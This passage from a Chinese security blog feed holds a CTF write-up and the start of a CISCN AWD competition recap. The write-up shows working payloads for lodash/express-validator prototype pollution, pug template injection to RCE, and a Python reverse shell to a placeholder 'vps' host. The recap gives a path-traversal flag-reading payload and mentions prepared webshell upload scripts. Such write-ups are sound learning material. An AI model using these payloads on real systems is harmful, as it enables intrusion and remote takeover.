原型链污染</h3><p>根据读到的package包引用，发现lodash版本为4.17.15。lodash&lt;4.17.17是有原型链污染漏洞的</p><img src="/article/2021dfjk/E34B2280959DFF59059010F95FFB5E8C.png" class="" title="E34B2280959DFF59059010F95FFB5E8C" loading="lazy"><p>这里给出<a href="https://paper.seebug.org/1426/">参考文章</a>引用部分，写的很详细，参考文章在文末</p><blockquote><p>测试数据包：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__[test]"</span><span class="token operator">:</span> <span class="token string">"123 "</span><span class="token punctuation">&#125;</span></code></pre><p>这里在segments.reduce函数中对输入的值进行了一些判断和替换。重要的点就是当传入的键中存在<code>.</code> ，则会在字符两边加上<code>[&quot; &quot;]</code>，并且最终返回的是一个字符串形式的结果。</p><p>接着之前的过程，在经过了过滤器的处理之后，会通过lodash.set对指定的path设置新值</p><img src="/article/2021dfjk/1607915420000-16044095450346.jpg-w331s" class="" title="-w1160" loading="lazy"><p>尝试污染<strong>proto</strong>[test]，结果发现是污染并没有成功，原因是因为，当lodash.set中第一个参数存在一个与第二个参数同名的键时，污染就会失败</p><p>所以，我们就要尝试去绕过这个点。 我们来看一下这个语句：</p><pre class="language-none"><code class="language-none">path !&#x3D;&#x3D; &#39;&#39; ? _.set(req[location], path, newValue) : _.set(req, location, newValue);</code></pre><p>这里的第一个参数是从请求中直接取出来的，path是经过先前处理后的出来的值。所以能不能通过这个处理来进行绕过呢？当然是可以的。 当我们传入：</p><pre class="language-none"><code class="language-none">&#123;&quot;\&quot;].__proto__[\&quot;test&quot;:&quot;123 &quot;&#125;</code></pre><p>这里的键为<code>&quot;].__proto__[&quot;test</code>，由于字符里面存在<code>.</code>，所以在segments.reduce函数处理时会对其左右加双引号和中括号，最终变成：<code>[&quot;&quot;].__proto__[&quot;test&quot;]</code>。</p><p>这时就不存在同名的键了，于是查看污染的后的值发现：</p><img src="/article/2021dfjk/1607915421000-16044107085533.jpg-w331s" class="" title="-w426" loading="lazy"><p>我们设置的值并没有传递进去，而是污染为了一个空值。为什么传递进来的newValue为空值呢？</p><p>从select-fields.js中可以看到，是因为取值时，使用的是lodash.get方法从<code>req[&#39;body&#39;]</code>中取被处理后的键值，处理后的键是不存在的，所以取出来的值就为undefined。当undefined传递到Sanitization.run方法中后，经过了一个<code>.toString()</code>的处理变成了<code>&#39;&#39;</code>空字符串。</p><p>利用lodash.get方法中读取键值的妙用得到最终的payload：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"test"</span><span class="token operator">:</span> <span class="token string">"testvalue"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token property">"a\"].__proto__[\"test"</span><span class="token operator">:</span> <span class="token number">222</span><span class="token punctuation">&#125;</span></code></pre><p>详细可在参考文章中查看</p></blockquote><p>于是进行测试</p><p>测试代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">9001</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    extended<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>    body<span class="token punctuation">,</span>    validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span>middlewares <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>middlewares<span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token string">"hellowrold"</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>    <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">server listening on </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>lod <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span>lod<span class="token punctuation">.</span><span class="token function">setWith</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"__proto__[isadmin]"</span><span class="token punctuation">,</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span></code></pre><p>根据原payload，可以发现，这里用json格式post的请求成功达到了目的，并且还能进行覆盖</p><img src="/article/2021dfjk/image-20210803151756631.png" class="" title="image-20210803151756631" loading="lazy"><p>但是问题在于题目是不解析json请求的，因此不能使用这种方式构造原型链污染</p><img src="/article/2021dfjk/image-20210803152057397.png" class="" title="image-20210803152057397" loading="lazy"><p>反思：比赛中由于未仔细审查代码，导致以为必须要覆盖为admin才行，错失了大量时间，其实只要是非notadmin就行</p><p>最终测试如下</p><img src="/article/2021dfjk/image-20210803151332184.png" class="" title="image-20210803151332184" loading="lazy"><p>Payload:<code>&quot;.constructor.prototype[&quot;xxx</code> </p><p>利用这样的构造器去达到覆盖<code>xxx</code>的目的，<code>.__proto__.</code> 这样是不行的</p><img src="/article/2021dfjk/image-20210803152912326.png" class="" title="image-20210803152912326" loading="lazy"><p>原型链污染成功</p><img src="/article/2021dfjk/image-20210803152818280.png" class="" title="image-20210803152818280" loading="lazy"><h3 id="第四步-命令执行"><a href="#第四步-命令执行" class="headerlink" title="第四步 - 命令执行"></a>第四步 - 命令执行</h3><p>继续看代码，发现<code>session.debug</code>后将<code>query</code>请求的<code>p</code>赋到了<code>info.pretty</code>里。</p><img src="/article/2021dfjk/image-20210803153247822.png" class="" title="image-20210803153247822" loading="lazy"><hr><p>要达到p，首先要覆盖<code>session.debug</code>，所以上一步最终payload为</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span><span class="token number">112222</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123456</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>isadmin<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token double-quoted-string string">".constructor.prototype["</span>debug<span class="token operator">=</span></code></pre><hr><p>利用文件读取读到了<code>/app/view/admin.pug</code></p><pre class="language-pug" data-language="pug"><code class="language-pug"><span class="token tag">html</span>  <span class="token tag">head</span>    <span class="token tag">title</span><span class="token punctuation">=</span><span class="token code"> title</span>    <span class="token tag">meta<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">http-equiv</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"Content-Type"</span></span><span class="token punctuation">,</span> <span class="token attr-name">content</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text/html;charset=UTF-8"</span></span><span class="token punctuation">)</span></span></span>  <span class="token tag">body</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">hello</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span></span>      <span class="token tag">p</span><span class="token punctuation">=</span><span class="token code"> text</span>      <span class="token tag">div</span> <span class="token plain-text">#&#123;msg&#125;</span>    <span class="token mixin"><span class="token keyword">mixin</span> <span class="token function">printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>      <span class="token tag">div</span> <span class="token plain-text">个性签名：</span>        <span class="token tag">div</span> <span class="token plain-text">#&#123;diy&#125;</span>        <span class="token tag">div</span> <span class="token plain-text">---#&#123;msg&#125;</span>    <span class="token tag">form<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">action</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">""</span></span><span class="token punctuation">,</span> <span class="token attr-name">method</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"get"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">div</span> <span class="token plain-text">更改图片</span>        <span class="token tag">select<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">name</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"newimg"</span></span><span class="token punctuation">)</span></span></span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/1.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">纸飞机</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/2.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">人</span>          <span class="token tag">option<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">value</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"./images/3.png"</span></span><span class="token punctuation">)</span></span></span> <span class="token plain-text">小火车</span>      <span class="token tag">div</span> <span class="token plain-text">个性签名</span>        <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"text"</span> name<span class="token operator">=</span><span class="token string">"diy"</span> value<span class="token operator">=</span><span class="token string">"尊贵的admin可以在这更改个性签名"</span></span><span class="token punctuation">)</span></span></span>      <span class="token tag">input<span class="token attributes"><span class="token punctuation">(</span><span class="token attr-name">type</span><span class="token punctuation">=</span><span class="token attr-value"><span class="token string">"submit"</span></span><span class="token punctuation">)</span></span></span>    <span class="token tag">div</span> <span class="token plain-text">&lt;img src='#&#123;png&#125;'></span>    <span class="token mixin"><span class="token name function">+hello</span><span class="token punctuation">(</span><span class="token string">"哈喽"</span><span class="token punctuation">)</span></span>    <span class="token mixin"><span class="token name function">+printdiy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span></code></pre><p>而pug这里存在命令执行漏洞，原因在pug模版引擎的一个<a href="https://github.com/pugjs/pug/issues/3312">issue</a>中提到的</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>p<span class="token operator">=</span><span class="token single-quoted-string string">');process.mainModule.constructor._load('</span>child_process<span class="token single-quoted-string string">').exec('</span>whoami<span class="token single-quoted-string string">');_=('</span></code></pre><p>反思：exec是不回显的！一直让我以为是我打的方式不对…</p><p>既然没回显那试一下发现是通外网的，就弹个shell回来。这算是个注入，一打整个界面变得惨不忍睹</p><img src="/article/2021dfjk/image-20210803153836972.png" class="" title="image-20210803153836972" loading="lazy"><p>普通的弹shell命令似乎并不管用，直接干它 用python命令弹shell</p><img src="/article/2021dfjk/image-20210803153955025.png" class="" title="image-20210803153955025" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?p&#x3D;&#39;);process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#39;vps\&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&#39;&#x2F;bin&#x2F;bash\&#39;,\&#39;-i\&#39;]);&quot;&#39;);_&#x3D;(&#39;</code></pre><p>成功弹到shell，获得flag</p><img src="/article/2021dfjk/image-20210803154137511.png" class="" title="image-20210803154137511" loading="lazy"><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>巅峰fw就是我了，做题经验还是不足，对于原型链污染这一块的知识经过这一次比赛的检测发现还是有所欠缺，抓紧总结巩固一下js原型链污染的知识点吧。</p><hr><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1426/">Seebug express-validator 6.6.0 原型链污染分析</a></p><p><a href="https://github.com/pugjs/pug/issues/3312">pug模版引擎issue</a></p><p><a href="https://www.mrkaixin.top/">@Mrkaixin师傅</a> 非常感谢Mrkaixin师傅的指导</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;深入学习一下JavaScript的原型链污染漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="原型链污染" scheme="https://err0r.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>2021ciscn华东北半决赛</title>
    <link href="https://err0r.top/article/2021ciscnawd/"/>
    <id>https://err0r.top/article/2021ciscnawd/</id>
    <published>2021-06-20T06:34:46.000Z</published>
    <updated>2021-06-26T00:20:51.042Z</updated>
    
    <content type="html"><![CDATA[<p>第一次打正式的国赛半决赛awd，复盘总结，分析与反思</p><a id="more"></a><h2 id="队伍名称：S3C-2021"><a href="#队伍名称：S3C-2021" class="headerlink" title="队伍名称：S3C_2021"></a>队伍名称：S3C_2021</h2><p>第31名</p><p>止步于此，虽不荣耀，但仅以此鞭策自己。为自己，为团队，为后继的学弟学妹们记录。</p><p>至暗时刻，虽不愿承认，本工作室打出了历史辉煌后最差的一次成绩</p><p>本人很自责，没能跟随师傅们的步伐前进，拖队伍后腿止步于半决赛</p><p>在此复盘总结</p><hr><h2 id="比赛时间：2021年6月19日-9-00-18-30"><a href="#比赛时间：2021年6月19日-9-00-18-30" class="headerlink" title="比赛时间：2021年6月19日 9:00-18:30"></a>比赛时间：2021年6月19日 9:00-18:30</h2><p>按照<code>时间：- 事件</code>格式进行完整复盘，以本人角度对赛况进行分析</p><h3 id="时间：比赛前-赛前准备"><a href="#时间：比赛前-赛前准备" class="headerlink" title="时间：比赛前 - 赛前准备"></a>时间：比赛前 - 赛前准备</h3><p>准备好了完备的awd不死码批量上传激活脚本，提交flag脚本，以及各类log日志及分析工具，按照去年情况，题目是web多pwn少，对于web做好了充分的准备，awd前期速度取胜，如果有简单后门就可以直接利用，达到全程拿分的目的。</p><p>本队三位web师傅一位pwn师傅</p><h3 id="时间：比赛时-赛况"><a href="#时间：比赛时-赛况" class="headerlink" title="时间：比赛时 - 赛况"></a>时间：比赛时 - 赛况</h3><h4 id="8-30左右-未开赛"><a href="#8-30左右-未开赛" class="headerlink" title="8:30左右 - 未开赛"></a>8:30左右 - 未开赛</h4><p>准备好设备，我带了两台电脑，一台电脑插上网线，开wifi，另一台电脑连接。由于m1的arm架构问题，有些事情不得不在windows上做，比如D盾扫描之类的，为防止纠纷我两台电脑都进行了录屏。</p><h4 id="9-00-第1轮"><a href="#9-00-第1轮" class="headerlink" title="9:00 - 第1轮"></a>9:00 - 第1轮</h4><p>开始比赛，靶机全部用ssh私钥连接，不存在篡改密码的情况。</p><p>第一批2道web两道pwn。以ip标号命名，<code>11/12</code> 是web，<code>13/15</code>是pwn</p><img src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>从左到右依次是11-17</p><p>上来我们三位web师傅首先下载ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>一看就是3web，4pwn。导入密钥后发现怎么都连不上，过了一段时间，主办方通知 有些靶机没有启动成功，正在启动，有问题举手示意。离谱的是，大家都没连上，某学校第一轮已经发现漏洞并写好脚本打了全场的分，独占鳌头。</p><p>第一轮由于靶机未启动成功，所以check down了，无语。</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-第2轮-直接进攻"><a href="#9-10-第2轮-直接进攻" class="headerlink" title="9:10 - 第2轮 - 直接进攻"></a>9:10 - 第2轮 - 直接进攻</h4><p>旁边web师傅连接成功，上去后首先挂了log和文件监控，然后拖下来源码开始扫。</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>直接发现文件包含漏洞，如下</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>调用show方法，直接可以文件包含<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>开始写脚本全场打，之前预先写好的提交flag脚本针对的是D段的，改成C段浪费了点时间。</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>然后直线上分，靠这一步稳步在了第5名。我们将此处调用直接注释，成功防御和check。11被打到了第3轮。</p><p>此时12，13，15还没有人出，我们开始分析源码挖洞。</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>上通防的给逮到了吧</p><h4 id="9-30左右-第4-5轮"><a href="#9-30左右-第4-5轮" class="headerlink" title="9:30左右 - 第4-5轮"></a>9:30左右 - 第4-5轮</h4><p>发现我们的服务直接就checkdown了，经确认，发现是waf和套壳的原因，我们下掉了waf和壳</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12被扣20分，15被扣10分</p><h4 id="9-50左右-第6-9轮"><a href="#9-50左右-第6-9轮" class="headerlink" title="9:50左右 - 第6-9轮"></a>9:50左右 - 第6-9轮</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>发现12大量宕机，警惕</p><p>第9轮，进到了第三名</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30左右-第10轮-pwn题一血"><a href="#10-30左右-第10轮-pwn题一血" class="headerlink" title="10:30左右 - 第10轮 - pwn题一血"></a>10:30左右 - 第10轮 - pwn题一血</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwn全场被攻击，开始分析流量</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwn爷在努力复现</p><p>第11轮，<code>TimeKeeper</code>直接凭借一题上了近700分，打到了第二，我们到了第四</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwn爷本地套壳尝试，发现本地可以，靶机不行。此时商量对策，由于我们排名较为靠前，为减少差距，我们决定宕机。这样宕机扣10分给全场，被打扣10分给打的人，不如给全场，于是决定自行宕机。</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwn爷重放失败，觉得是方式问题，我们让他稳住，慢慢检查。</p><h4 id="11-20左右-第15轮"><a href="#11-20左右-第15轮" class="headerlink" title="11:20左右 - 第15轮"></a>11:20左右 - 第15轮</h4><p>13被攻击</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>由于部分队伍重放成功，我们掉到了第7。我们鼓励pwn师傅优先重放，暂时不用修。</p><p>同时我帮忙检查了流量</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>怀疑是混淆流量，最后证实不需要这么复杂。当时让pwn师傅先保存，优先看15.</p><h4 id="11-40-第17轮-被人关站"><a href="#11-40-第17轮-被人关站" class="headerlink" title="11:40 - 第17轮 - 被人关站"></a>11:40 - 第17轮 - 被人关站</h4><p>（主办方送饭来了）</p><p>突发状况，web2大量宕机。发现网站被人关闭了。经主办方提醒，web2有后台管理，密码默认，被人批量改了密码登陆后台关闭了网站。网站显示<code>网站暂时关闭，维护中……</code></p><p>黑，真tm的黑啊。</p><p>还好网站有备份，尝试复原，发现无法复原，没有权限。</p><p>但是数据库还在，尝试修改数据库里的admin密码，发现是md5，生成后发现不对，密码应该是加盐了</p><p><strong>各方尝试后，在11:45左右，我们向主办方申请了重置靶机12。</strong></p><p>重置完成后立刻登陆，可是人家写好了批量攻击脚本，我们没人家快</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>这时候突发奇想，搜索源码</p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>既然这有判断，那就干脆全部注释，或者把<code>0</code>改成<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>网站恢复了，但这次处理耗费了大量时间，我们已经开始乱了阵脚</p><p>此时pwn师傅那决定13也自行宕机。</p><h4 id="12-00-第19轮-修复12"><a href="#12-00-第19轮-修复12" class="headerlink" title="12:00 - 第19轮 - 修复12"></a>12:00 - 第19轮 - 修复12</h4><p>危机还未解除，我们发现12还是checkdown的状态</p><p>同时12点上了新题，刷新发现，上了两道pwn题，pwn师傅直接瘫倒在了椅子上，我们三个web心里凉了一截，已经认定本次比赛我们基本上已经输了。（此时要是上1web1pwn也许还有机会，可是上了2pwn题）</p><p>pwn师傅此时发现不会重放流量，意味着我们pwn题没有输出了，同时尝试修复，发现修复就checkdown，意味着我们现在2web4pwn，4pwn完全就是送分的状态，基本上结局已定。</p><p>11/12为web，13/15为pwn，14/16为新上的pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>我们让pwn师傅稳住，不管结果如何我们一起接受，此时大家都心知肚明，可是没人敢点破…</p><p><strong>即使注定失败，我们也得战到最后</strong></p><p>目前web任务：修复好12</p><p>我去审计代码</p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>找到了Admin后台路由为<code>/Admin/login</code>（其实审流量能看到，可是被人打了混淆太恶心了）</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>在<code>application/admin/controller/Admin.php</code>下发现验证方式</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>跟进<code>func_encrypt</code>看，发现确实加盐了，现在要找到位置，继续跟进</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>发现应该存在数据库中，幸亏数据库未被改密码</p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>在数据库中找到盐</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>update一下admin的密码，成功修改成功，把网站恢复正常了。</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-第21轮"><a href="#12-20-第21轮" class="headerlink" title="12:20 - 第21轮"></a>12:20 - 第21轮</h4><p>我们掉到了17名</p><p>此时新上的14直接被人a掉了，不过是试探性的打了两个队，下一轮就要全场打了</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-第25轮"><a href="#13-00-第25轮" class="headerlink" title="13:00 - 第25轮"></a>13:00 - 第25轮</h4><p>（主办方提示饭凉了，我们还没动过旁边的饭）</p><p>此时掉到了26名</p><p>我审计14的流量，发现流量很简单，没有地址特殊字符等等</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>我叫pwn师傅先看这题，此时pwn师傅神情恍惚</p><h4 id="14-00-第31轮"><a href="#14-00-第31轮" class="headerlink" title="14:00 - 第31轮"></a>14:00 - 第31轮</h4><p>此时16被人解出，我们掉到了30名</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwn师傅尝试修复14，被checkdown并被攻击</p><h4 id="14-20-第33轮-pwn重放成功"><a href="#14-20-第33轮-pwn重放成功" class="headerlink" 